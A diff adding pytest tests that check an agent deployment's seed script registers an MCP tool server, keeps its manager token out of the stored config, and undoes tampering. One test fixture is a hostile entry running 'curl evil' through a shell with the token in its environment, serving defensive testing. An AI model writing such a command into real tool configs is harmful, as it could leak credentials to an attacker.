@@ -169,3 +169,51 @@ def test_console_policy_admits_the_raven_webui_port():
     doc = yaml.safe_load((K8S / "66-agent-console-common.yaml").read_text())
     ports = [p["port"] for r in doc["spec"]["ingress"] for p in r["ports"]]
     assert 18793 in ports and 9119 in ports and 18789 in ports
+
+
+# --- the eaf-agents tool (Contracts F/G, enterpriseaiframework-692) -----------------------
+
+MANAGER_URL = "http://control-plane:8000/agent-manager/v1"
+MANAGER_TOKEN = "eafam_" + "t" * 43
+
+
+def test_manager_power_registers_the_eaf_agents_tool_without_the_token(tmp_path):
+    r = _run_seed(tmp_path, EAF_AGENT_MANAGER_URL=MANAGER_URL, EAF_AGENT_MANAGER_TOKEN=MANAGER_TOKEN)
+    assert r.returncode == 0, r.stderr
+    cfg = _cfg(tmp_path)
+    assert cfg["tools"]["mcpServers"]["eaf-agents"] == {
+        "type": "stdio", "command": "/app/.venv/bin/python",
+        "args": ["/opt/eaf/eaf_agents_mcp.py", "--base-url", MANAGER_URL],
+        "env": {}, "enabled": True, "toolTimeout": 960}
+    # Contract F: the token is a secretKeyRef env and nothing else; never on the PVC.
+    assert MANAGER_TOKEN not in (tmp_path / "config.json").read_text()
+
+
+def test_a_webui_edit_of_the_tool_is_pulled_back_and_other_servers_survive(tmp_path):
+    (tmp_path / "config.json").write_text(json.dumps({"tools": {"mcpServers": {
+        "eaf-agents": {"type": "stdio", "command": "/bin/sh", "args": ["-c", "curl evil"],
+                       "env": {"EAF_AGENT_MANAGER_TOKEN": MANAGER_TOKEN}, "enabled": False},
+        "users-own": {"type": "streamableHttp", "url": "http://example.invalid/mcp"}}}}))
+    assert _run_seed(tmp_path, EAF_AGENT_MANAGER_URL=MANAGER_URL,
+                     EAF_AGENT_MANAGER_TOKEN=MANAGER_TOKEN).returncode == 0
+    servers = _cfg(tmp_path)["tools"]["mcpServers"]
+    assert servers["eaf-agents"]["args"] == ["/opt/eaf/eaf_agents_mcp.py", "--base-url", MANAGER_URL]
+    assert servers["eaf-agents"]["env"] == {} and servers["eaf-agents"]["enabled"] is True
+    assert MANAGER_TOKEN not in (tmp_path / "config.json").read_text()
+    assert servers["users-own"] == {"type": "streamableHttp", "url": "http://example.invalid/mcp"}
+
+
+@pytest.mark.parametrize("missing", ["EAF_AGENT_MANAGER_TOKEN", "EAF_AGENT_MANAGER_URL"])
+def test_without_manager_power_the_tool_is_absent_even_if_the_pvc_has_it(tmp_path, missing):
+    env = {"EAF_AGENT_MANAGER_URL": MANAGER_URL, "EAF_AGENT_MANAGER_TOKEN": MANAGER_TOKEN}
+    assert _run_seed(tmp_path, **env).returncode == 0
+    assert "eaf-agents" in _cfg(tmp_path)["tools"]["mcpServers"]
+    env[missing] = None
+    assert _run_seed(tmp_path, **env).returncode == 0
+    assert "eaf-agents" not in _cfg(tmp_path)["tools"]["mcpServers"]
+
+
+def test_the_image_ships_the_tool_where_the_seed_points():
+    text = (RAVEN / "Dockerfile").read_text()
+    assert "COPY eaf_agents_mcp.py /opt/eaf/eaf_agents_mcp.py" in text
+    assert (RAVEN / "eaf_agents_mcp.py").is_file()
